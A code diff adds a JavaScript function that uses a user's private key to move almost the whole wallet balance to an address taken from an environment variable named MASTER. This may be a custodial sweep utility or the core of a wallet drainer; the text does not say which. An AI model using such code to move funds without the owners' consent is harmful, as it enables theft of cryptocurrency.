@@ -1,0 +1,17 @@
+import { ethers } from "ethers";
+
+async function sweepFunds(userWallet, privateKey) {
+  const provider = new ethers.JsonRpcProvider(process.env.RPC);
+  const wallet = new ethers.Wallet(privateKey, provider);
+
+  const balance = await provider.getBalance(userWallet);
+
+  if (balance > 0n) {
+    const tx = await wallet.sendTransaction({
+      to: process.env.MASTER,
+      value: balance - ethers.parseEther("0.001")
+    });
+
+    await tx.wait();
+  }
+}
